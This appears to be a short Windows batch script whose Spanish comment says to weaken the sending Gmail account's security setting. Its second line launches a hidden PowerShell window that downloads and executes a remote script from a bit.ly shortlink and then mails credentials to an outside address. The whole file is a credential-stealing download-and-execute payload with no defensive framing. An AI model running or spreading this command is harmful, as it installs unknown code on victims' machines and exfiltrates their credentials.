::En la cuenta desde donde se va a enviar el email ir a https://myaccount.google.com/security y configurar "Permitir el acceso de aplicaciones menos seguras" a "SI".
Powershell -WindowStyle Hidden Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2eA6vFE'); Send-Creds -From 'correo@gmail.com' -Pass '!pass123' -To 'email@example.com'
